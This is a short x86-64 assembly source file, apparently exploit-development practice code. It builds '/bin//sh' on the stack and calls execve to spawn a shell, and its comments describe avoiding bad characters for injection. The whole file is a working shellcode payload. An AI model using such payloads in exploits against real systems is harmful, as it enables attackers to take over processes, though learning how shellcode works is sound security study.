SECTION .text
global _start

_start:

; execve("/bin//sh", "sh", 0)

xor rdx, rdx            ; Third argument rdx = 0

push rdx                ; NULL delimiter on stack
mov bx, "sh"
push word bx
mov rbx, rsp            ; rbx = rsp ="sh" (8 bytes)
push rdx                ; NULL delimiter on stack
push rbx
mov rsi, rsp            ; Second argument rsi = "sh"

push rdx                ; NULL delimiter on stack
mov rbx, "/bin//sh"     ; add one / more to have 8 bytes and eliminate bad characters
push rbx
mov rdi, rsp            ; First argument rdi = "/bin//sh"

xor rax, rax            ; rax = 0
add rax, 59             ; rax = 59 (execve syscall number)
syscall
